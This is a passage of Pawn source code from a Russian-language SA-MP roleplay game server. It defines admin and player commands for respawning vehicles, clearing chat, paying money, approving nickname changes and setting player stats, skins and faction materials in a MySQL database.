	new ratingLvNews = 0;
	new procls = 0, procsf = 0, proclv = 0;
	foreach(i)
	{
		if(gNews[i] == 0) ratingGNews++, radioall++;
		if(lNews[i] == 0) ratingLNews++, radioall++;
		if(LvNews[i] == 0) ratingLvNews++, radioall++;
	}
	procls = 100 / radioall * ratingLNews;
	procsf = 100 / radioall * ratingGNews;
	proclv = 100 / radioall * ratingLvNews;
	points[0] = 100 - procls;
	points[1] = 100 - procsf;
	points[2] = 100 - proclv;
	format(stringskill,999,"<< Количество слушателей >>\n\nLS News:\t[%s]%i%% %i человек\nSF News:\t[%s]%i%% %i человек\nLV News:\t[%s]%i%% %i человек",
	ToDevelopSkills(procls,points[0]),procls,ratingLNews,
	ToDevelopSkills(procsf,points[1]),procsf,ratingGNews,
	ToDevelopSkills(proclv,points[2]),proclv,ratingLvNews);
	ShowPlayerDialogEx(playerid,1100,DIALOG_STYLE_MSGBOX,"Сообщение",stringskill,"Выбрать","Назад");
	return true;
}
CMD:spcar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GREY," Вы не в машине");
	SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	return true;
}
CMD:spcars(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	new value, radius = 60;
	if(sscanf(params, "d",value))
	{
		SCM(playerid, -1, " Введите: /spcars [количество] по умолчанию радиус 60.0");
		//SCM(playerid, -1, " [1] - все | [2] - кроме домашних | [3] - незанятые | [4] - кроме своей | [5] - админские");
		SCM(playerid, -1, " [1]-все [2]-кроме домашних [3]-кроме тех, где есть водитель");
		SCM(playerid, -1, " [4]-кроме своей [5]-админские");
		return true;
	}
	new Float:x1, Float:y1, Float:z1;
	switch(value)
	{
	    case 1:
	    {
	        for(new i = 0; i < MAX_VEHICLES; i++)
	        {
	            GetVehiclePos(i, x1, y1, z1);
	            if(!IsPlayerInRangeOfPoint(playerid, radius+2, x1, y1, z1)) continue;
				SetVehicleToRespawn(i);
	        }
	    }
	    case 2:
	    {
	        for(new i = 0; i < MAX_VEHICLES; i++)
	        {
	            GetVehiclePos(i, x1, y1, z1);
	            if(!IsPlayerInRangeOfPoint(playerid, radius+2, x1, y1, z1)) continue;
	            new bool:is = false;
				foreach(j)
	            {
	            	if(i == house_car[j])
					{
						is = true;
						break;
					}
            	}
            	if(is) continue;
				SetVehicleToRespawn(i);
	        }
	    }
	    case 3:
	    {
	        for(new i = 0; i < MAX_VEHICLES; i++)
	        {
	            GetVehiclePos(i, x1, y1, z1);
	            if(!IsPlayerInRangeOfPoint(playerid, radius+2, x1, y1, z1)) continue;
	            if(!IsVehicleOccupied(i)) continue;
				SetVehicleToRespawn(i);
	        }
	    }
	    case 4:
	    {
	    	for(new i = 0; i < MAX_VEHICLES; i++)
	        {
	            GetVehiclePos(i, x1, y1, z1);
	            if(!IsPlayerInRangeOfPoint(playerid, radius+2, x1, y1, z1)) continue;
	            if(GetPlayerVehicleID(playerid) == i) continue;
				SetVehicleToRespawn(i);
	        }
	    }
	    case 5:
	    {
	        for(new i = 0; i < MAX_VEHICLES; i++)
	        {
	            GetVehiclePos(i, x1, y1, z1);
	            if(!IsPlayerInRangeOfPoint(playerid, radius+2, x1, y1, z1)) continue;
             	if(SERVERCARID[i]) continue;
             	SetVehicleToRespawn(i);
	        }
	    }
        default: return SCM(playerid, COLOR_GREY, " Не правильное значение");
	}
	SCM(playerid,COLOR_BLUE," Машины заспавнены");
	format(YCMDstr,sizeof(YCMDstr)," Администратор: %s заспавнил машины",Name(playerid));
	printf("Администратор %s заспавнил машины [code: %i]", Name(playerid), value);
	return ProxDetector(radius, playerid, YCMDstr, COLOR_LIGHTRED,COLOR_LIGHTRED,COLOR_LIGHTRED,COLOR_LIGHTRED,COLOR_LIGHTRED);
}
CMD:cc(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	for(new i = 0; i < 60; i++) SendClientMessageToAll(-1, " ");
	printf("Администратор %s очистил чат");
	return true;
}
CMD:cclear(playerid)
{
	for(new i = 0; i < 60; i++) SCM(playerid, -1, " ");
	return true;
}
CMD:free(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] == 7 && PlayerInfo[playerid][pRank] == 2)
	{
		if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /free [id] [цена]");
		if(PlayerInfo[params[0]][pJailTime] <= 2) return SCM(playerid, COLOR_GRAD1, " Человек не в тюрьме!");
		if(params[1] < 1 || params[1] > 50000) { SCM(playerid, COLOR_GREY, " Цена не может быть меньше 1 и больше 50000!"); return true; }
		if(params[1] == playerid)  return  SCM(playerid,COLOR_GRAD1, " [Ошибка] Вы указали свой ID");
		format(YCMDstr, sizeof(YCMDstr), " [Адвокат] Вы предложили %s выпустить его за %i вирт",Name(params[0]),params[1]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " [Адвокат] %s предлагает Вам свободу за %i вирт",PlayerInfo[playerid][pName],params[1]);
		SCM(params[0], 0x6495EDFF, YCMDstr);
		ShowPlayerDialogEx(params[0],6622,DIALOG_STYLE_MSGBOX, "Адвокатские услуги", "Выберите способ оплаты:", "Наличные", "Банк");
		FreeOffer[params[0]] = playerid;
		FreePrice[params[0]] = params[1];
		SposobOffer[params[0]] = 0;
	}
	else return SCM(playerid, COLOR_GREY, " Вы не адвокат");
	return true;
}
CMD:selleat(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || PlayerInfo[playerid][pJob] != 3) return true;
	if(sscanf(params, "u", params[0])) return	SCM(playerid, -1, " Введите: /selleat [playerid]");
	if((GetPlayerVehicleID(playerid) < hotdogcar[0] || GetPlayerVehicleID(playerid) > hotdogcar[1]) && !GetPVarInt(playerid,"h_stall")) return SCM(playerid,COLOR_GREY," Вы не можете продать хот дог");
	if(!GetPVarInt(playerid,"h_contract")) return SCM(playerid,COLOR_GREY," Вы не заключили контракт с закусочной");
	if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid,"rentcar_job") && !GetPVarInt(playerid,"h_stall")) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль");
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid,COLOR_GREY," Игрок должен находиться рядом с вами");
	SendMes(playerid,0x6495EDFF," Вы предложили %s ХотДог за %i вирт",Name(params[0]),GetPVarInt(playerid,"h_price"));
	SendMes(params[0],0x6495EDFF," %s предлагает Вам ХотДог за %i вирт. (( Введите: /(ac)cept hotdog для покупки ХотДога ))",PlayerInfo[playerid][pName],GetPVarInt(playerid,"h_price"));
	SetPVarInt(params[0],"h_id",playerid+1);
	return true;
}
CMD:setnik(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /setnik [id]");
	if(params[0] == INVALID_PLAYER_ID) return true;
	if(strlen(WantNickChange[params[0]]) < 3) return SCM(playerid,-1, " Этот игрок не хочет менять ник");
	format(YCMDstr,sizeof(YCMDstr), " %s одобрил заявку на смену ника: %s >> %s",Name(playerid),Name(params[0]),WantNickChange[params[0]]);
	SendClientMessageToAll(COLOR_LIGHTRED,YCMDstr);
	SCM(playerid,-1," Ник одобрен");
	mysql_format(DATABASE,QUERY,128,"SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE Name= '%s'",WantNickChange[params[0]]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",15,params[0],playerid);
	printf("Администратор %s одобрил заявку на смену ника: %s >> %s", Name(playerid), Name(params[0]),WantNickChange[params[0]]);
	return true;
}
CMD:cname(playerid, params[])
{
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /cname [id]");
	if(params[0] == INVALID_PLAYER_ID) return true;
	if(!IsAMayor(playerid)) return SCM(playerid,COLOR_GREY," Функция доступна только мэру, заместителю мэра, и секретарю");
	if(strlen(WantNickChange[params[0]]) < 3) return SCM(playerid,-1, "Этот игрок не подавал заявку на смену ника");
	format(YCMDstr,sizeof(YCMDstr), " %s одобрил заявку на смену ника: %s >> %s",Name(playerid),Name(params[0]),WantNickChange[params[0]]);
	SendClientMessageToAll(COLOR_YELLOW,YCMDstr);
	SCM(playerid,-1," Ник одобрен");
	mysql_format(DATABASE,QUERY,128,"SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE Name= '%s'",WantNickChange[params[0]]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",15,params[0],playerid);
	printf("[CNAME] Мэр %s одобрил заявку на смену ника: %s >> %s", Name(playerid), Name(params[0]),WantNickChange[params[0]]);
	return true;
}
CMD:setskin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /setskin [skin_ID]");
	if(params[0] > 311 || params[0] < 1) { SCM(playerid, COLOR_GREY, " ID может быть от 1 до 311"); return true; }
	PlayerInfo[playerid][pChar][0] = params[0];
	SetPlayerSkin(playerid, PlayerInfo[playerid][pChar][0]);
	PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0);
	printf("Администратор %s выдал себе скин %i", Name(playerid), params[0]);
	mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pChar = '%i', pChars = '%i, %i, %i, %i, %i, %i' WHERE name = '%e'",
	PlayerInfo[playerid][pChar][0], params[0], params[0], params[0],
    params[0], params[0], params[0], PlayerInfo[playerid][pName]);
    mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:setplayerskin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /setplayerskin [playerid] [skin_ID]");
	if(params[1] > 311 || params[1] < 1) { SCM(playerid, COLOR_GREY, " ID может быть от 1 до 311"); return true; }
	if(!IsPlayerConnected(params[0])) return true;
	if(params[0] == INVALID_PLAYER_ID) return true;
	PlayerInfo[params[0]][pChar][0] = params[1];
	format(YCMDstr, sizeof(YCMDstr), " Вы изменили скин %s на номер: %i",Name(params[0]),params[1]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	SetPlayerSkin(params[0], PlayerInfo[params[0]][pChar][0]);
	printf("Администратор %s выдал %s скин %i", Name(playerid), Name(params[0]), params[1]);
	mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pChar = '%i', pChars = '%i, %i, %i, %i, %i, %i' WHERE name = '%e'",
	PlayerInfo[params[0]][pChar][0], params[1], params[1], params[1],
    params[1], params[1], params[1], PlayerInfo[params[0]][pName]);
    mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:pay(playerid, params[])
{
	if(sscanf(params, "ud", params[0],params[1])) return	SCM(playerid, -1, " Введите: /pay [playerid] [сумма]");
	if((params[1] > 1000 && PlayerInfo[playerid][pLevel] < 1) || (params[1] > 10000 && PlayerInfo[playerid][pLevel] < 2)) return SCM(playerid, COLOR_GRAD1, " Сумма должна быть от 1 до 1000");
	if(params[1] < 1 || params[1] > 100000) return SCM(playerid, COLOR_GRAD1, " Сумма должна быть от 1 до 100000");
	if(!IsPlayerConnected(params[0])) return true;
	if(params[0] == INVALID_PLAYER_ID) return true;
	if(!ProxDetectorS(5.0, playerid, params[0])) return SCM(playerid, COLOR_GRAD1, " Вы слишком далеко!");
	if(GetSRVMoney(playerid) < params[1]) return true;
	PlayerInfo[params[0]][pCash] += params[1];
	PlayerInfo[playerid][pCash] -= params[1];
	format(YCMDstr, sizeof(YCMDstr), " Вы передали %s[%i] %i вирт",Name(params[0]),params[0],params[1]);
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	SCM(playerid, COLOR_GRAD1, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Вы получили %i вирт от %s[%i]",params[1],PlayerInfo[playerid][pName], playerid);
	SCM(params[0], COLOR_GRAD1, YCMDstr);
	PlayerPlaySound(params[0], 1052, 0.0, 0.0, 0.0);
	format(YCMDstr,sizeof(YCMDstr), "Достал бумажник и передал деньги %s",Name(params[0]));
	SetPlayerChatBubble(playerid,YCMDstr,COLOR_PURPLE,30.0,10000);
	printf("[PAY] %s передал %s %i вирт", PlayerInfo[playerid][pName], PlayerInfo[params[0]][pName], params[1]);
	return true;
}
CMD:setmats(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd", params[0],params[1]))
	{
		SCM(playerid, -1, " Введите: /setmats [номер] [количество]");
		SCM(playerid, -1, " [1] - LSPD, [2] - FBI, [3] - SFA, [4] - Yakuza, [5] - LCN, [6] - SFPD, [7] - Ballas, [8] - Vagos");
		SCM(playerid, -1, " [9] - RM, [10] - Grove, [11] - Aztecas, [12] - Rifa, [13] - Army LV, [14] - LVPD");
		SCM(playerid, -1, " [15] - Hell's Angels MC, [16] - Warlocks MC, [17] - Pagans MC");
		return true;
	}
	switch (params[0])
	{
	case 1:
		{
			lspdmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы LSPD изменены на: %i", params[1]);
		}
	case 2:
		{
			fbimats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы FBI изменены на: %i", params[1]);
		}
	case 3:
		{
			armmatsf = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы SFA изменены на: %i", params[1]);
		}
	case 4:
		{
			yakuzamats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Yakuza изменены на: %i", params[1]);
		}
	case 5:
		{
			lcnmats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы LCN изменены на: %i", params[1]);
		}
	case 6:
		{
			sfpdmats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы SFPD изменены на: %i", params[1]);
		}
	case 7:
		{
			ballasmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Ballas изменены на: %i", params[1]);
		}
	case 8:
		{
			vagosmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Vagos изменены на: %i", params[1]);
		}
	case 9:
		{
			rmmats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы RM изменены на: %i", params[1]);
		}
	case 10:
		{
			groovmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Grove изменены на: %i", params[1]);
		}
	case 11:
		{
			aztekmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Aztecas изменены на: %i", params[1]);
		}
	case 12:
		{
			rifamatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Rifa изменены на: %i", params[1]);
		}
	case 13:
		{
			armmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы LVA изменены на: %i", params[1]);
		}
	case 14:
		{
			lvpdmats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы LVPD изменены на: %i", params[1]);
		}
	case 15:
	    {
	    	hamcmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Hell's Angels MC изменены на: %i", params[1]);
	    }
   	case 16:
	    {
	    	wmcmatbi = params[1];
	    	format(YCMDstr, sizeof(YCMDstr), " Материалы Warlocks MC изменены на: %i", params[1]);
	    }
	case 17:
	    {
	    	pmcmatbi = params[1];
	    	format(YCMDstr, sizeof(YCMDstr), " Материалы Pagans MC изменены на: %i", params[1]);
	    }  
	default:
		{
			format(YCMDstr, sizeof(YCMDstr), " [Ошибка] Вы ввели неверное число");
		}
	}
	SCM(playerid, COLOR_GRAD1, YCMDstr);
	printf("Администратор $s установил материалы %i фракции на %i", Name(playerid), params[0], params[1]);
	return true;
}
CMD:setstatcar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 9) return true;
	if(sscanf(params, "udddd", params[0], params[1], params[2], params[3], params[4])) return SCM(playerid, -1, " Введите: /setstatcar [playerid] [player car id] [carid] [color1] [color2]");
	if(params[0] == INVALID_PLAYER_ID || !IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн");
	if(params[1] < 0 || params[1] > 4) return SCM(playerid, COLOR_GREY, " Номер авто игрока может быть от 0 до 4");
	if(params[2] < 400 || params[2] > 611) return SCM(playerid, COLOR_GREY, " ID авто может быть от 400 до 611");
	if(params[3] < 0 || params[3] > 235) return SCM(playerid, COLOR_GREY, " Цвет может быть от 0 до 235");
	if(params[4] < 0 || params[4] > 235) return SCM(playerid, COLOR_GREY, " Цвет может быть от 0 до 235");
	CarInfo[params[0]][carModel][params[1]] = params[2];
	CarInfo[params[0]][carFuel][params[1]] = 200;
	CarInfo[params[0]][carPercent][params[1]] = 100;
	CarInfo[params[0]][carColor_one][params[1]] = params[3];
	CarInfo[params[0]][carColor_two][params[1]] = params[4];
	format(string, sizeof(string), "/veh %i %i %i", params[2], params[3], params[4]);
	CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
	return true;
}
CMD:setstat(playerid, params[])
{
	new giveplayerid;
	new stat;
	new amount;
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "udd",giveplayerid,stat,amount))
	{
		SCM(playerid, -1, " Введите: /setstat [id] [номер] [количество]");
		SCM(playerid, COLOR_GREY, " [1] Уровень|[2] Законопослушность|[3] Материалы|[4] Скин|[5] Преступлений|[6] Номер телефона");
		SCM(playerid, COLOR_GREY, " [7] Exp|[8] Ключ от дома |[9] Номер бизнеса|[10] VIP [1-3]|[11] Работа игрока|[12] Сытость");
		SCM(playerid, COLOR_GREY, " [13] Деньги в банке|[14] Счёт мобильного|[15] Деньги|[16] Варны|[17] Наркотики");
		SCM(playerid, COLOR_GREY, " [18] Член орг|[19] Донат счётчик|[20] Box|[21] Kong Fu|[22] Kick Box");
		SCM(playerid, COLOR_GREY, " [23] Машина|[24] Цвет авто 1|[25] Цвет авто 2|[26] Наркозависимость|[27] Скин организации");
		SCM(playerid, COLOR_GREY, " [28] Помолвлен на|[29] Проценты Авто|[30] Мастерская|[31] Скилл таксиста|[32] Навык вождения");
		SCM(playerid, COLOR_GREY, " [33] Ключи от камеры|[34] Рейтинг бандита");
		return true;
	}
	if(!IsPlayerConnected(giveplayerid)) return true;
	if(giveplayerid == INVALID_PLAYER_ID) return true;
	switch (stat)
	{
	case 1:
		{
			PlayerInfo[giveplayerid][pLevel] = amount;
			format(string, 128, " LVL игрока изменён на: %i", amount);
			DollahScoreUpdate(giveplayerid);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pLevel = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pLevel], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 2:
		{
			PlayerInfo[giveplayerid][pZakonp] = amount;
			format(string, 128, " Законопослушность: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pZakonp = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pZakonp], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 3:
		{
			PlayerInfo[giveplayerid][pMats] = amount;
			format(string, 128, " Материалы: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pMats = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pMats], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 4:
		{
			PlayerInfo[giveplayerid][pChar][0] = amount;
			format(string, 128, " Скин игрока установлен на: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pChar = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pChar][0], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 5:
		{
			PlayerInfo[giveplayerid][pCrimes] = amount;
			format(string, 128, " Преступлений: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCrimes = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pCrimes], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 6:
		{
			PlayerInfo[giveplayerid][pPnumber] = amount;
			format(string, 128, " Номер телефона игрока изменён на: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pPnumber = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pPnumber], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 7:
		{
			PlayerInfo[giveplayerid][pExp] = amount;
			format(string, 128, " EXP игрока изменены на: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pExp = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pExp], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 8:
		{
			PlayerInfo[giveplayerid][pPHouseKey] = amount;
			format(string, 128, " Дом: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pPHouseKey = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pPHouseKey], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 9:
		{
		    BizzInfo[amount][bLocked] = 0;
			BizzInfo[amount][bPrice] = 100;
			BizzInfo[amount][bTill] = 0;
			BizzInfo[amount][bLandTax] = BizzLandTax[amount]*12;
			BizzPay[amount] = 0;
			BizzInfo[amount][bLicense] = 0;
			BizzInfo[amount][bStavka] = 0;
			BizzInfo[amount][bMinStavka] = 0;
			BizzInfo[amount][bTimeStavka] = 0;
			BizzInfo[amount][bLastStavka] = 0;
			BizzInfo[amount][bLockTime] = 0;
			BizzInfo[amount][bEntranceCost] = 100;
			strmid(BizzInfo[amount][bOwner],PlayerInfo[giveplayerid][pName], 0, 32, 32);
			BGet(giveplayerid), SendMes(giveplayerid,COLOR_GREEN," Вы новый владелец бизнеса %i! {FFFFFF}(( Управление: /mm > Команды сервера ))", amount);
			strmid(BizzInfo[amount][bNameStavka], "-", 0, strlen("-"), 10);
			UpdateBizz(giveplayerid);
			format(string, 128, " Бизнес: %i", amount);
		}
	case 10:
		{
			PlayerInfo[giveplayerid][pDonateRank] = amount;
			format(string, 128, " VIP аккаунт уровня: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pDonateRank = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pDonateRank], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 11:
		{
			PlayerInfo[giveplayerid][pJob] = amount;
			format(string, 128, " Работа: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pJob = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pJob], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 12:
		{
			PlayerInfo[giveplayerid][pSatiety] = amount;
			format(string, 128, " Сытость игрока: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pSatiety], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 13:
		{
			PlayerInfo[giveplayerid][pBank] = amount;
			format(string, 128, " Деньги в банке изменены на: %i вирт", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pBank], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 14:
		{
			PlayerInfo[giveplayerid][pMobile] = amount;
			format(string, 128, " Счёт мобильного: %i вирт", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pMobile = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pMobile], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");

		}
	case 15:
		{
			PlayerInfo[giveplayerid][pCash] = amount;
			format(string, 128, " Деньги изменены на: %i вирт", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pCash], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 16:
		{
			PlayerInfo[giveplayerid][pWarns] = amount;
			format(string, 128, " Количество варнов изменено на: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pWarns = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pWarns], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 17:
		{
			PlayerInfo[giveplayerid][pDrugs] = amount;
			format(string, 128, " Количество наркотиков изменено на: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pDrugs = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pDrugs], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 18:
		{
			PlayerInfo[giveplayerid][pMember] = amount;
			PlayerInfo[giveplayerid][pRank] = 1;
			format(string, 128, " Организация: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pMobile = '%i', pRank = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pMobile], PlayerInfo[giveplayerid][pRank], PlayerInfo[giveplayerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 19:
		{
			PlayerInfo[giveplayerid][pDonateAccount] = amount;
			format(string, 128, " Донат счётчик изменён на: %i {F3FF02}GOLD {FFFFFF}COINS", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pDonateAccount], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 20:
		{
			PlayerInfo[giveplayerid][pBoxSkill] = amount;
			format(string, 128, " Уровень боевых искусств Box: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pBoxSkill = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pBoxSkill], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 21:
		{
			PlayerInfo[giveplayerid][pKongfuSkill] = amount;
			format(string, 128, " Уровень боевых искусств Kong Fu: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pKongfuSkill = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pKongfuSkill], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 22:
		{
			PlayerInfo[giveplayerid][pKickboxSkill] = amount;
			format(string, 128, " Уровень боевых искусств Kick Box: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pKickboxSkill = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pKickboxSkill], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 23:
		{
		    new cars;
		    if(sscanf(params, "uddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [id] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");
			CarInfo[giveplayerid][carModel][cars] = amount;
			CarInfo[giveplayerid][carFuel][cars] = 200;
			CarInfo[giveplayerid][carPercent][cars] = 100;
			format(string, 128, " Машина: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_CARS"` SET model = '%i', fuel = '%f', percent = '%i' WHERE id = '%i' AND owner = '%s'", CarInfo[giveplayerid][carModel][cars], CarInfo[giveplayerid][carFuel][cars], CarInfo[giveplayerid][carPercent][cars], cars, PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 24:
		{
			new cars;
		    if(sscanf(params, "uddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [id] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");
			CarInfo[giveplayerid][carColor_one][cars] = amount;
			format(string, 128, " Цвет 1: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_CARS"` SET color_one = '%i' WHERE id = '%i' AND owner = '%s'", CarInfo[giveplayerid][carColor_one][cars], cars, PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 25:
		{
			new cars;
